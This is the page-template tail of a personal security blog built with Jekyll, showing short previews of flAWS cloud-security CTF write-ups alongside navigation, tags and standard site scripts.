class="pt-0 my-2">flAWS 1</h4><div class="text-muted"><p> Level 1 This level is buckets of fun. See if you can find the first sub-domain. Begin with doing a dig of flaws.cloud, which returns the following → ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.1-Ubuntu &amp;lt;...</p></div></div></a></article><article class="col"> <a href="/blog/posts/flaws-2-attacker/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1683956520" data-df="ll" > May 13, 2023 </time><h4 class="pt-0 my-2">flAWS 2 - Attacker</h4><div class="text-muted"><p> Level 1 The problem statement is to enter a correct pin code on a website that is 100 digits long. The first thing to do is to look at the HTML source, where the form that takes the input sub...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/blog/posts/pentester-academy-aws-iam/" class="btn btn-outline-primary" aria-label="Older" ><p>Pentester Academy AWS IAM Attack Lab</p></a> <a href="/blog/posts/github-fundamentals/" class="btn btn-outline-primary" aria-label="Newer" ><p>Fundamentals of GitHub</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p> © <time>2024</time> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/linux/">linux</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B88HEPZBVJ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-B88HEPZBVJ'); }); </script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
